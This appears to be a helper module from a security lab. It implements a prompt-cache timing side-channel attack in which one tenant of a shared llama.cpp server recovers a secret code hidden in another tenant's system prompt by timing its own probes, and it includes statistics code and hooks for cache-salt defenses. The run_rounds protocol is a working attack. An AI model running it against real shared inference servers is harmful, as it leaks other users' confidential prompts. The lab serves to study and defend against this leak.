"""Shared constants, protocol and statistics for LAB-24 attack-cache-sidechannel (a helper module,
not a step).

Two tenants share one llama.cpp server (the `serving` fixture, labs/_shared/serving):

* tenant A, the victim: Lantern Labs' billing assistant. Its system prompt starts with a per-
  conversation tag, names the shop, and hides one of four escalation codes right after it. Every
  prompt it sends carries the fixed lab canary CANARY when the live code is the canary's.
* tenant B, the attacker: any other client that can reach the server. It knows the victim's prompt
  template (leaked config) and holds the four candidate codes. It never reads A's text; it times
  its own first-contact probes.

Why candidates rotate: the server caches every prompt it processes (the prompt cache is hundreds of
MB), so a probe leaves B's own copy in the cache and a second probe of the same text is fast whoever
primed it. Each round therefore uses a fresh conversation tag and every probe is first contact.

Statistics are stdlib: Mann-Whitney U (exact by dynamic programming when feasible, otherwise a
tie-corrected normal approximation), Wilson intervals and bootstraps come from the shared evalkit.
"""

import json
import math
import random
import uuid

import labkit

CANARY = "ATLAS-CANARY-kv24"          # the fixed lab canary (front matter `canary:`)
CANARY_CODE = "kv24"                  # the code that completes the canary
SEED = 24                             # the shipped reference protocol seed
ROUNDS = 24                           # rounds in Step 3 (the timing attack)
RUN = uuid.uuid4().hex[:6]            # per-invocation nonce: reruns must not meet their own cache

_ASSETS = labkit.lab() / "assets" / "candidates.json"
A = json.loads(_ASSETS.read_text())
SHOP = A["shop"]                      # "Lantern Labs"
ROLE = A["role"]                      # "billing assistant"
CODES = A["codes"]                    # four 4-char codes; CODES[0] completes the canary
TAIL = A["tail"]                      # the long boilerplate after the code
HEAD = A["head"]                      # the fixed text before the code
QUESTION = A["question"]              # the victim's customer question
PROBE = A["probe"]                    # the attacker's one-word user turn

assert CANARY_CODE in CODES and CODES[0] == CANARY_CODE, "assets/candidates.json: code list must start with the canary code"


def system_prompt(code: str, tag: str) -> str:
    """The victim's system prompt for one conversation: [tag] head + code + tail."""
    return f"[{tag}] {HEAD.format(code=code)} {TAIL}"


def tag_for(round_: int) -> str:
    """A fresh per-conversation tag: one nonce per script run (so a rerun never meets its own
    cached probes) plus the round number (so every probe inside a run is first contact)."""
    return f"CASE-{RUN}-{round_:04d}"


def token_count(base, text) -> int:
    """Token count from the server's /tokenize endpoint."""
    import serving
    r = serving.post(base, "/tokenize", {"content": text})
    return len((r.json() or {}).get("tokens", []))


# ---------------------------------------------------------------- the measurement protocol
def victim_turn(base, code, tag, key=None, max_tokens=8, salt="", **kw):
    """Tenant A answers one customer: primes the cache with its whole rendered prompt.
    `salt` is the per-tenant cache salt a gateway would prepend (defense D1)."""
    import serving
    return serving.chat(base, [{"role": "system", "content": salt + system_prompt(code, tag)},
                               {"role": "user", "content": QUESTION}], key=key, max_tokens=max_tokens, **kw)


def probe(base, code, tag, key=None, salt="", **kw):
    """Tenant B's probe: the same template with a candidate code and a one-word user turn.
    Returns (seconds, cache_n_or_None); cache_n is the oracle a real API would strip."""
    import serving
    r = serving.chat(base, [{"role": "system", "content": salt + system_prompt(code, tag)},
                            {"role": "user", "content": PROBE}], key=key, max_tokens=1, **kw)
    tim = (r.json() or {}).get("timings") or {}
    return r.seconds, tim.get("cache_n")


def run_rounds(base, rounds, seed=SEED, key=None, key_a=None, key_b=None, salt_a="", salt_b="", true_first=False):
    """The seeded attack protocol. Each round: A starts a conversation with one live code (round 0
    always uses the canary code), then B probes all four candidates once, in seeded random order,
    and picks the fastest. `key` sets both tenants' key (a bare server); `key_a`/`key_b` split them
    and `salt_a`/`salt_b` prepend a per-tenant cache salt (the gateway defenses). `true_first`
    forces the live candidate to be probed first (used for the Ollama comparison, which keeps
    context only for the most recent request). Returns a dict with per-round rows and the flat
    hit/miss samples; hits are the live-code probes, misses the rest.
    """
    rng = random.Random(seed)
    rows, hits, misses, oracle_ok = [], [], [], 0
    codes = list(CODES)
    ka, kb = key_a or key, key_b or key
    for rnd in range(rounds):
        live = 0 if rnd == 0 else rng.randrange(len(codes))
        tag = tag_for(rnd)
        victim_turn(base, codes[live], tag, key=ka, salt=salt_a)
        order = list(range(len(codes)))
        if true_first:
            order.remove(live)
            rng.shuffle(order)
            order.insert(0, live)
        else:
            rng.shuffle(order)
        times, caches = {}, {}
        for i in order:
            sec, cache_n = probe(base, codes[i], tag, key=kb, salt=salt_b)
            times[i] = sec
            caches[i] = cache_n
            (hits if i == live else misses).append(sec)
        pick = min(times, key=times.get)
        rows.append({"round": rnd, "tag": tag, "live": live, "pick": pick, "ok": pick == live,
                     "hit_ms": round(times[live] * 1000, 1),
                     "miss_ms": [round(times[i] * 1000, 1) for i in order if i != live],
                     "times_ms": {i: round(times[i] * 1000, 1) for i in order},
                     "order": order,
                     "hit_cache_n": caches[live],
                     "oracle_agrees": caches[live] is not None and all(
                         (caches[live] or 0) > (caches[i] if caches[i] is not None else -1)
                         for i in order if i != live)})
        if rows[-1]["oracle_agrees"]:
            oracle_ok += 1
    return {"rounds": rounds, "seed": seed, "rows": rows,
            "hits_s": hits, "misses_s": misses, "oracle_ok": oracle_ok}


# ---------------------------------------------------------------- statistics (stdlib)
def _exact_p_count(n1, n2, u):
    """(arrangements with U1 <= u, total arrangements) over all ways to pick group-1 ranks
    (Mann-Whitney exact distribution, dynamic programming)."""
    dp = {(0, 0): 1}
    for total in range(n1 + n2):
        cur = {}
        for (m, uu), ways in dp.items():
            if m < n1:                       # next smallest rank joins group 1: U1 += group-2 before it
                k = (m + 1, uu + total - m)
                cur[k] = cur.get(k, 0) + ways
            if total - m < n2:               # joins group 2: U1 unchanged
                k = (m, uu)
                cur[k] = cur.get(k, 0) + ways
        dp = cur
    total_ways = math.comb(n1 + n2, n1)
    return sum(w for (m, uu), w in dp.items() if uu <= u), total_ways


def mann_whitney(a, b):
    """Mann-Whitney U for samples a and b. Returns (U1, z, p, auc): U1 = #(a > b) + 0.5 #(a == b),
    z from the tie-corrected normal approximation, p two-sided (exact by DP when n1*n2 <= 4096 and
    there are no ties; no continuity correction), auc = P(a < b) + 0.5 P(a == b)."""
    if not a or not b:
        return None, None, None, None
    n1, n2 = len(a), len(b)
    arr = sorted([(x, 0) for x in a] + [(x, 1) for x in b])
    rank, i = [0.0] * len(arr), 0
    ties = {}
    while i < len(arr):
        j = i
        while j < len(arr) and arr[j][0] == arr[i][0]:
            j += 1
        avg = (i + 1 + j) / 2
        for k in range(i, j):
            rank[k] = avg
        ties[j - i] = ties.get(j - i, 0) + 1
        i = j
    R1 = sum(rank[k] for k in range(len(arr)) if arr[k][1] == 0)
    U1 = R1 - n1 * (n1 + 1) / 2          # U1 = #(a > b) + 0.5 #(a == b)
    auc = (n1 * n2 - U1) / (n1 * n2)     # P(a < b) + 0.5 P(a == b)
    N = n1 + n2
    tie_term = sum(cnt * (t ** 3 - t) for t, cnt in ties.items())   # ties: {run length: how many}
    var = n1 * n2 / 12 * ((N + 1) - tie_term / (N * (N - 1))) if N > 1 else 1
    z = (U1 - n1 * n2 / 2) / math.sqrt(var) if var > 0 else 0.0
    if tie_term == 0 and n1 * n2 <= 4096:
        le, total = _exact_p_count(n1, n2, math.floor(U1))          # P(U1 <= U1_obs)
        ge, _ = _exact_p_count(n1, n2, math.floor(n1 * n2 - U1))    # P(U1 >= U1_obs), by symmetry
        p = min(1.0, 2 * min(le, ge) / total)
    else:
        p = min(1.0, 2 * (0.5 * math.erfc(abs(z) / math.sqrt(2))))
    return U1, z, p, auc


def fmt_p(p) -> str:
    if p is None:
        return "n/a"
    return f"{p:.2e}" if p < 0.001 else f"{p:.3f}"


def summarize(res):
    """The standard honest summary of one run_rounds() result: medians, spread, MWU, pick accuracy
    with a Wilson interval, and how often the oracle counter (when present) agreed with the pick."""
    import evalkit as ek
    import serving
    hits, misses = res["hits_s"], res["misses_s"]
    U, z, p, auc = mann_whitney(hits, misses)
    ok = ek.Rate.of([r["ok"] for r in res["rows"]])
    chance = 1 / len(CODES)
    out = {
        "rounds": res["rounds"], "seed": res["seed"],
        "hit_med_ms": round(serving.percentile(hits, 50) * 1000, 1),
        "hit_min_ms": round(min(hits) * 1000, 1), "hit_max_ms": round(max(hits) * 1000, 1),
        "miss_med_ms": round(serving.percentile(misses, 50) * 1000, 1),
        "miss_min_ms": round(min(misses) * 1000, 1), "miss_max_ms": round(max(misses) * 1000, 1),
        "ratio": round(serving.percentile(misses, 50) / serving.percentile(hits, 50), 2),
        "U": round(U, 1) if U is not None else None, "z": round(z, 2) if z is not None else None,
        "p": p, "auc": round(auc, 3) if auc is not None else None,
        "picks": ok.to_dict(), "chance": chance, "oracle_ok": res.get("oracle_ok", 0),
    }
    return out


def print_summary(title, s, oracle=False):
    import evalkit as ek
    print(f"\n{title}")
    print(f"  hit  probes n={s['rounds']:>3}  median {s['hit_med_ms']:>7.1f} ms  "
          f"range {s['hit_min_ms']:.1f}-{s['hit_max_ms']:.1f}")
    print(f"  miss probes n={s['rounds'] * (len(CODES) - 1):>3}  median {s['miss_med_ms']:>7.1f} ms  "
          f"range {s['miss_min_ms']:.1f}-{s['miss_max_ms']:.1f}")
    print(f"  median ratio miss/hit {s['ratio']}x   Mann-Whitney U={s['U']} z={s['z']} p={fmt_p(s['p'])}"
          f"   AUC {s['auc']} (P(hit faster than miss))")
    r = ek.Rate(s["picks"]["k"], s["picks"]["n"])
    print(f"  rounds picked right: {r.fmt()}   chance would give {100 * s['chance']:.0f}%")
    if oracle:
        print(f"  the cache_n oracle (a real API hides it) agreed with the fastest-probe pick in "
              f"{s['oracle_ok']}/{s['rounds']} rounds")


def save(name, obj):
    path = labkit.out(name)
    path.write_text(json.dumps(obj, indent=1) + "\n")
    return path


def load(name):
    path = labkit.out(name)
    return json.loads(path.read_text()) if path.exists() else None
